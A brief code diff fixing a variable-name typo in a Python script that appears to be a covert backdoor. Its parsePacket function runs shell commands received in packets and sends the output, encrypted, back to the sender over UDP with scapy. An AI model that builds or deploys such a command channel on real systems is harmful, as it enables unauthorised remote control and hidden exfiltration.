@@ -50,7 +50,7 @@ def parsePacket(receivedPacket):
     output = executeShellCommand(command)
     print "Output: " + output
 
-    returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=receivedPacket['UDP'].dport)/encrypt(ouput)
+    returnPacket = IP(src=receivedPacket["IP"].dst, dst=receivedPacket["IP"].src)/UDP(dport=receivedPacket['UDP'].sport,sport=receivedPacket['UDP'].dport)/encrypt(output)
     time.sleep(0.5)
 
     print "Sending Packet: "
